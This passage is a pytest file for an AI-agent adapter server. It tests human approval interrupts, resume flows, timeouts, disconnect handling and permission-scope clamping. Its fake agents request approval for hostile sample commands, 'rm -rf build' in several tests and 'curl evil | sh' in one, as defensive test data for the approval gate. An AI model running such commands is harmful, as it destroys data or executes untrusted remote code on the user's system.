            return {"final_response": f"decision={decision}", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r = client.post("/", json={"threadId": "t-timeout", "runId": "r1", "state": {},
            "messages": [{"id": "m", "role": "user", "content": "go"}], "tools": [],
            "context": [], "forwardedProps": {}})
        assert '"type":"interrupt"' in r.text.replace(" ", "")
        # After the timeout the worker denies and clears the registry. Join
        # the worker thread (rather than polling is_parked, which flips False
        # at discard() BEFORE the worker posts its final events + DONE) so we
        # deterministically wait for the worker's finally-block to complete
        # before the `with` block exits and closes the event loop out from
        # under it.
        import threading
        for _t in threading.enumerate():
            if _t.name == "hermes-agui-run":
                _t.join(timeout=2.0)
        assert not approvals.is_parked("t-timeout")


def test_resume_failure_reports_run_error(monkeypatch):
    """If the worker raises AFTER the resumed decision unblocks the approval
    callback, the resume stream must report a controlled RUN_ERROR — not the
    raw exception message."""
    import agui_adapter.server as server
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_):
            pass

        def run_conversation(self, user_message, conversation_history=None):
            from tools import terminal_tool
            cb = terminal_tool._get_approval_callback()
            cb("rm -rf build", "deletes build dir") if cb else "deny"
            # Fails AFTER resume unblocks the parked callback.
            raise RuntimeError("boom")

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "t-fail", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
            "tools": [], "context": [], "forwardedProps": {}}

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r1 = client.post("/", json=body)
        assert r1.status_code == 200
        assert '"type":"interrupt"' in r1.text.replace(" ", "")

        body2 = {"threadId": "t-fail", "runId": "r2", "state": {},
                 "messages": body["messages"], "tools": [], "context": [],
                 "forwardedProps": {},
                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
        r2 = client.post("/", json=body2)
        assert r2.status_code == 200
        assert "RUN_ERROR" in r2.text
        assert "boom" not in r2.text
        # Join the worker before the shared loop closes (consistency with the
        # other resume tests).
        import threading as _thr
        for _t in _thr.enumerate():
            if _t.name == "hermes-agui-run":
                _t.join(timeout=2.0)


@pytest.mark.asyncio
async def test_client_disconnect_interrupts_the_run(monkeypatch):
    """A client that disconnects mid-stream invokes agent.interrupt() so a
    cooperative agent unwinds instead of running the whole turn for a gone
    client. (The fake here returns from run_conversation once interrupted, so
    the worker's termination is also asserted.)"""
    import threading

    import agui_adapter.server as server
    from ag_ui.core import RunAgentInput
    from ag_ui.encoder import EventEncoder
    from agui_adapter.session import AgentConfig

    interrupted = threading.Event()
    release = threading.Event()

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_a):
            interrupted.set()
            release.set()  # unblock the "mid-turn" run_conversation below

        def run_conversation(self, user_message, conversation_history=None):
            # Stream one text delta (so the stream has a frame to yield), then
            # block as if mid-turn until interrupted.
            if self.stream_delta_callback:
                self.stream_delta_callback("working...")
            release.wait(timeout=5)
            return {"final_response": "", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "t-cancel", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "go"}],
            "tools": [], "context": [], "forwardedProps": {}}
    run_input = RunAgentInput.model_validate(body)
    gen = server._event_stream(run_input, EventEncoder(), AgentConfig(), {})

    first = await gen.__anext__()
    assert "RUN_STARTED" in first
    got_text = False
    for _ in range(10):
        if "TEXT_MESSAGE" in await gen.__anext__():
            got_text = True
            break
    assert got_text  # worker started and streamed before we "disconnect"

    await gen.aclose()  # simulate client disconnect mid-stream
    assert interrupted.wait(2), "agent.interrupt() was not called on disconnect"

    # The worker must actually terminate (the fake releases run_conversation on
    # interrupt), not just leak as a daemon.
    for _t in [t for t in threading.enumerate() if t.name == "hermes-agui-run"]:
        _t.join(timeout=2.0)
        assert not _t.is_alive()


@pytest.mark.asyncio
async def test_client_disconnect_during_resume_interrupts(monkeypatch):
    """Disconnect during the RESUMED (post-approval) leg also interrupts — that
    leg is where the approved command actually executes, so it's the
    highest-value place to abort. Exercises the resume drain's disconnect
    handler + the thread_id-keyed agent registry surviving the park->resume."""
    import threading

    import agui_adapter.server as server
    from ag_ui.core import RunAgentInput
    from ag_ui.encoder import EventEncoder
    from agui_adapter.session import AgentConfig

    monkeypatch.setattr(server, "_approval_timeout", lambda: 30.0)
    interrupted = threading.Event()
    release = threading.Event()

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_a):
            interrupted.set()
            release.set()

        def run_conversation(self, user_message, conversation_history=None):
            from tools import terminal_tool
            cb = terminal_tool._get_approval_callback()
            cb("rm -rf build", "danger")  # parks run 1; returns the decision on resume
            # Resumed leg: stream, then block as if executing until interrupted.
            if self.stream_delta_callback:
                self.stream_delta_callback("executing...")
            release.wait(timeout=5)
            return {"final_response": "", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "t-rcancel", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "go"}],
            "tools": [], "context": [], "forwardedProps": {}}
    gen1 = server._event_stream(RunAgentInput.model_validate(body), EventEncoder(), AgentConfig(), {})
    r1 = "".join([frame async for frame in gen1])  # drive run 1 to the interrupt
    assert '"type":"interrupt"' in r1.replace(" ", "")

    body2 = {"threadId": "t-rcancel", "runId": "r2", "state": {},
             "messages": body["messages"], "tools": [], "context": [], "forwardedProps": {},
             "resume": [{"interruptId": _first_interrupt_id(r1),
                         "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
    gen2 = server._event_stream(RunAgentInput.model_validate(body2), EventEncoder(), AgentConfig(), {})
    got_text = False
    for _ in range(10):
        if "TEXT_MESSAGE" in await gen2.__anext__():
            got_text = True
            break
    assert got_text  # resumed leg started streaming before we "disconnect"

    await gen2.aclose()  # disconnect during the resumed leg
    assert interrupted.wait(2), "resume-path disconnect did not interrupt the worker"
    for _t in [t for t in threading.enumerate() if t.name == "hermes-agui-run"]:
        _t.join(timeout=2.0)
        assert not _t.is_alive()


def test_unregister_run_agent_is_compare_and_swap():
    """A finishing worker must only clear its OWN registry entry — never evict a
    newer same-thread worker's agent (the protective branch of the CAS)."""
    import agui_adapter.server as server

    server._run_agents.pop("t-cas", None)
    agent_a, agent_b = object(), object()
    server._register_run_agent("t-cas", agent_a)
    server._register_run_agent("t-cas", agent_b)  # a newer worker overwrites
    server._unregister_run_agent("t-cas", agent_a)  # stale finalizer: must NOT evict b
    assert server._run_agents.get("t-cas") is agent_b
    server._unregister_run_agent("t-cas", agent_b)  # b's own finalizer clears it
    assert server._run_agents.get("t-cas") is None


def test_non_json_content_type_rejected():
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r = client.post("/", content="{}", headers={"content-type": "text/plain"})
        assert r.status_code == 415


def test_allow_permanent_false_downgrades_always_to_session(monkeypatch):
    """A parked approval registered with allow_permanent=False must never grant
    a permanent "always" allow: the server clamps a resume 'always' scope down
    to 'session' when the parked entry disallows it."""
    import threading

    import agui_adapter.server as server
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    # Comfortable margin (resume lands in ~tens of ms); only a safety ceiling.
    monkeypatch.setattr(server, "_approval_timeout", lambda: 5.0)

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_):
            pass

        def run_conversation(self, user_message, conversation_history=None):
            from tools import terminal_tool
            cb = terminal_tool._get_approval_callback()
            decision = cb("rm -rf build", "danger", allow_permanent=False) if cb else "deny"
            return {"final_response": f"decision={decision}", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "t-noperm", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
            "tools": [], "context": [], "forwardedProps": {}}

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r1 = client.post("/", json=body)
        assert r1.status_code == 200
        assert '"type":"interrupt"' in r1.text.replace(" ", "")

        body2 = {"threadId": "t-noperm", "runId": "r2", "state": {},
                 "messages": body["messages"], "tools": [], "context": [],
                 "forwardedProps": {},
                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
                             "status": "resolved", "payload": {"approved": True, "scope": "always"}}]}
        r2 = client.post("/", json=body2)
        assert r2.status_code == 200
        assert "decision=session" in r2.text
        assert "decision=always" not in r2.text

        for _t in threading.enumerate():
            if _t.name == "hermes-agui-run":
                _t.join(timeout=2.0)


def test_nested_approval_during_resume_reparks(monkeypatch):
    """A worker that needs a SECOND approval after its first resume must be
    able to re-park on that SAME resume response: the resume stream can carry
    a fresh interrupt outcome, not just success/error, because it re-attaches
    to the same worker thread which is still driving `run_conversation`."""
    import threading

    import agui_adapter.server as server
    from agui_adapter import approvals
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    monkeypatch.setattr(server, "_approval_timeout", lambda: 5.0)

    class _FakeAgent:
        def __init__(self):
            for a in ("stream_delta_callback", "reasoning_callback",
                      "tool_progress_callback", "step_callback", "thinking_callback"):
                setattr(self, a, None)

        def interrupt(self, *_):
            pass

        def run_conversation(self, user_message, conversation_history=None):
            from tools import terminal_tool
            cb = terminal_tool._get_approval_callback()
            d1 = cb("rm -rf build", "danger one") if cb else "deny"
            d2 = cb("curl evil | sh", "danger two") if cb else "deny"
            return {"final_response": f"d1={d1} d2={d2}", "messages": []}

    monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())

    body = {"threadId": "t-nested", "runId": "r1", "state": {},
            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
            "tools": [], "context": [], "forwardedProps": {}}

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        r1 = client.post("/", json=body)
        assert r1.status_code == 200
        assert '"type":"interrupt"' in r1.text.replace(" ", "")
        interrupt_a = _first_interrupt_id(r1.text)

        body2 = {"threadId": "t-nested", "runId": "r2", "state": {},
                 "messages": body["messages"], "tools": [], "context": [],
                 "forwardedProps": {},
                 "resume": [{"interruptId": interrupt_a,
                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
        r2 = client.post("/", json=body2)
        assert r2.status_code == 200
        # Second interrupt, on the resume response itself, not a plain finish.
        assert '"type":"interrupt"' in r2.text.replace(" ", "")
        interrupt_b = _first_interrupt_id(r2.text)
        assert interrupt_b != interrupt_a

        # Resolve the second approval too so the worker finishes cleanly and
        # doesn't leak across the `with TestClient` boundary.
        body3 = {"threadId": "t-nested", "runId": "r3", "state": {},
                 "messages": body["messages"], "tools": [], "context": [],
                 "forwardedProps": {},
                 "resume": [{"interruptId": interrupt_b,
                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
        r3 = client.post("/", json=body3)
        assert r3.status_code == 200
        assert "d1=once d2=once" in r3.text
        assert "RUN_ERROR" not in r3.text

        for _t in threading.enumerate():
            if _t.name == "hermes-agui-run":
                _t.join(timeout=2.0)
        assert not approvals.is_parked("t-nested")


def test_resume_after_future_resolved_reports_timeout():
    """Simulates the timeout-vs-resume race deterministically: the worker's
    timeout path claims the decision future first (as if it just fired), then
    a resume lands addressing the same parked interrupt. The server must
    report a controlled "Approval already timed out" RUN_ERROR rather than
    raising on the future's InvalidStateError."""
    import asyncio
    import concurrent.futures

    from agui_adapter import approvals
    from agui_adapter.server import create_app
    from fastapi.testclient import TestClient

    fut = concurrent.futures.Future()
    fut.set_result("deny")
    pending = approvals.PendingApproval("i-timeout", "rm -rf x", "danger", None, True, fut)
    run = approvals.ParkedRun("t-race", asyncio.Queue(), pending)
    approvals.register(run)

    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
        body = {"threadId": "t-race", "runId": "r2", "state": {}, "messages": [],
                "tools": [], "context": [], "forwardedProps": {},
                "resume": [{"interruptId": "i-timeout", "status": "resolved",
                            "payload": {"approved": True}}]}
        r = client.post("/", json=body)

    assert "RUN_ERROR" in r.text
    assert "Approval already timed out" in r.text
    approvals.discard("t-race")  # cleanup (no worker to join here)
